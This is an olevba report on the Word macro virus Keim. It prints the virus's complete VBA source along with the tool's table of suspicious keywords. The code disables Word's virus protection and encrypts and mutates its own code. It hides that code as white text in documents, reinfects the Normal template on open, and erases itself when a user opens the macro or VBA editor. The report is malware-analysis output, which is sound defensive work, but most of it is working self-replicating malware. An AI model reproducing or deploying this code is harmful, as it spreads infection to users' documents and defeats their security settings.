olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Keim-7d01b1b8c2843de29b25296a981d1bdd630b17c3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Keim-7d01b1b8c2843de29b25296a981d1bdd630b17c3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Keim-7d01b1b8c2843de29b25296a981d1bdd630b17c3 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Dim anzvar As Integer, chiffre As String, zaehler As Long
Dim var(1 To 50) As String, neuvar(1 To 50) As String
Dim start(0 To 35) As Integer
Dim newplace(1 To 35) As Integer
Dim zeilen(0 To 35) As String
If ActiveDocument.Saved = True Then GoTo Ende
'VL
Set host = NormalTemplate.VBProject.VBComponents.Item(1)
Set target = ActiveDocument.VBProject.VBComponents.Item(1)
Options.VirusProtection = False
Options.SaveNormalPrompt = True
Options.ConfirmConversions = False
Application.ScreenUpdating = False
target.CodeModule.DeleteLines 1, target.CodeModule.CountOfLines
Randomize
ActiveDocument.Content.InsertAfter Chr$(13)
neulist = "';"
With host.CodeModule
codeschluessel = Int(Rnd() * 20 + 1)
ActiveDocument.Content.InsertAfter Chr(codeschluessel + 40)
zaehler = 1
While (Mid(.Lines(zaehler, 1), 1, 2) <> "';" And .CountOfLines > i)
zaehler = zaehler + 1
Wend
';vcode;laenge;flag;zeichen;chiffre;neuvar;anzvar;neuzeile;zeile;Ausstieg;Ende;Keimzelle;var;neulist;Changename;Zeile;target;host;zaehler;zaehler2;maxlabel;labe;codeschluessel;newplace;start;zahl;
anzvar = 0
zeile = .Lines(zaehler, 1)
For zeichen = 3 To Len(zeile)
If Mid(zeile, zeichen, 1) <> ";" Then
chiffre = chiffre + Mid(zeile, zeichen, 1)
Else
anzvar = anzvar + 1
var(anzvar) = chiffre
neuvar(anzvar) = ""
For zaehler = 1 To Len(chiffre)
neuvar(anzvar) = neuvar(anzvar) + Chr(Int(Rnd() * 25 + 65))
Next zaehler
neulist = neulist & neuvar(anzvar) & ";"
chiffre = ""
End If
Next zeichen
For zaehler = 1 To .CountOfLines
zeile = .Lines(zaehler, 1)
For zaehler2 = 1 To anzvar
If InStr(zeile, var(zaehler2)) > 0 Then
For zeichen = 1 To Len(zeile)
If Mid(zeile, zeichen, Len(var(zaehler2))) = var(zaehler2) Then Mid(zeile, zeichen) = neuvar(zaehler2)
Next zeichen
End If
Next zaehler2
neuzeile = Chr(167)
For zaehler2 = 1 To Len(zeile)
neuzeile = neuzeile & Chr(Asc(Mid(zeile, zaehler2, 1)) + codeschluessel)
Next zaehler2
vcode = vcode + neuzeile
Next zaehler
ActiveDocument.Content.InsertAfter vcode & Chr(167)
ActiveDocument.Paragraphs(ActiveDocument.Paragraphs.Count).Range.Font.ColorIndex = wdWhite
For zaehler = 1 To .ProcCountLines("Keimzelle", vbext_pk_Proc)
target.CodeModule.insertlines 1, .Lines(.ProcCountLines("Keimzelle", vbext_pk_Proc) + .ProcStartLine("Keimzelle", vbext_pk_Proc) - zaehler, 1)
Next
target.CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
End With
With target.CodeModule
maxlabel = 0
For zaehler = 1 To .CountOfLines
If Mid(.Lines(zaehler, 1), 7, 1) = ":" Then start(maxlabel) = zaehler: zeilen(maxlabel) = .Lines(zaehler, 1): maxlabel = maxlabel + 1
Next zaehler
maxlabel = maxlabel - 2
For zaehler = 1 To maxlabel
flag = False
While flag = False
flag = True
zahl = Int(Rnd() * maxlabel) + 1
For zaehler2 = 1 To zaehler
If newplace(zaehler2) = zahl Then flag = False
Next zaehler2
Wend
newplace(zaehler) = zahl
Next zaehler
For zaehler = 1 To maxlabel
.DeleteLines start(zaehler), 1
.insertlines start(zaehler), zeilen(newplace(zaehler))
Next zaehler
End With
ActiveDocument.Save
Ende:   Application.ScreenUpdating = True
End Sub
Sub Keimzelle()
On Error Resume Next
label0: Set target = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: GoTo labe01
labe01: Application.ScreenUpdating = False: GoTo label1
label1: If target.Find("VL", 1, target.CountOfLines, True, False, False) Then GoTo labe13 Else GoTo labe1a
labe1a: NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: GoTo label2
label2: zeichen = ActiveDocument.Paragraphs(ActiveDocument.Paragraphs.Count).Range.Text: GoTo label3
label3: codeschluessel = Asc(Mid(zeichen, 1, 1)) - 40: GoTo label4
label4: zaehler2 = 1: GoTo label5
label5: zaehler = 2: GoTo label6
label6: If zaehler <= Len(zeichen) Then GoTo label7 Else GoTo labe13
label7: If Mid(zeichen, zaehler, 1) = Chr(167) Then GoTo label8 Else GoTo labe12
label8: target.insertlines zaehler2, zeile: GoTo label9
label9: zaehler2 = zaehler2 + 1: GoTo labe10
labe10: zeile = "": GoTo labe11
labe11: zaehler = zaehler + 1: GoTo label6
labe12: zeile = zeile & (Chr(Asc(Mid(zeichen, zaehler, 1)) - codeschluessel)): GoTo labe11
labe13: ActiveDocument.Paragraphs(ActiveDocument.Paragraphs.Count).Range.Delete: GoTo Ausstieg
Ausstieg: Application.ScreenUpdating = True
End Sub
Sub ToolsMacro()
For zaehler = 1 To Documents.Count
Documents(zaehler).VBProject.VBComponents(1).CodeModule.DeleteLines 1, Documents(zaehler).VBProject.VBComponents(1).CodeModule.CountOfLines
Documents(zaehler).Saved = True
Next zaehler
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.Saved = True
ShowField:  Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ViewVBCode()
For zaehler = 1 To Documents.Count
Documents(zaehler).VBProject.VBComponents(1).CodeModule.DeleteLines 1, Documents(zaehler).VBProject.VBComponents(1).CodeModule.CountOfLines
Documents(zaehler).Saved = True
Next zaehler
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.Saved = True
Show:  Application.ShowVisualBasicEditor = True
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

